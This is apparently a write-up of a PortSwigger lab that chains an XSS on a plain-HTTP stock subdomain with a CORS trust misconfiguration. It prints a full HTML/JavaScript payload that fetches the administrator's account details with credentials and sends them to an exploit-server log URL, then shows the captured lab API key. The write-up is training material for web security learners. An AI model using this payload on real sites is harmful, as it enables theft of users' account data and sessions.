# CORS vulnerability with trusted insecure protocols

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cors/lab-breaking-https-attack), you'll learn: CORS vulnerability with trusted insecure protocols! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227063843.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227063855.png)

**In the previous labs, we found that when we're logged in, it'll send a GET request to `/accountDetails`, which fetches account's data:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227063938.png)

**Let's send that request to Burp Repeater, and add a HTTP header called `Origin` with a random host:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227064050.png)

Hmm... The response header doesn't reflect our `Origin` host.

**In the lab's background, it said:**

> This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all subdomains regardless of the protocol.

That being said, this website whitelists a trusted subdomain that is using **plain HTTP**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227065527.png)

**After poking around the website, I found that the "Check stock" feature is using HTTP:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227064909.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227064919.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227064934.png)

When I clicked the "Check stock" button, **it pops up another window that's pointing to `http://stock.0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/?productId=1&storeId=1`, which is a subdomain in `0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net`**

**Also, the `productId` parameter is vulnerable to XSS(Cross-Site Scripting)!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227065943.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227065956.png)

**Armed with above information, we can craft a XSS payload that contains the account details!**
```html
<html>
    <head>
        <title>CORS-3</title>
    </head>
    <body>
        <script>
            document.location="http://stock.0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload = reqListener; req.open('get','https://0a2f00a40350fcf1c11785b000d500ee.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://exploit-0a930014030dfc71c11e84f601550032.exploit-server.net/log?data='%2bthis.responseText; };;%3c/script>&storeId=1"
        </script>
    </body>
</html>
```

**Then host it on the exploit server, and test it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071205.png)

**Exploit server access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071239.png)

It worked!

**Let's deliver it to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071300.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071320.png)

```json
{
    "username": "administrator",
    "email": "",
    "apikey": "CPI6UWhwMcmQ1gbk2cCcL7fiD7kK1x0T",
    "sessions": [
        "W1JCjX2NapNO0t6baehAUl56QKVgJ23v"
    ]
}
```

**Let's submit that API key!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071404.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Origin-Resource-Sharing/CORS-3/images/Pasted%20image%2020221227071429.png)

# What we've learned:

1. CORS vulnerability with trusted insecure protocols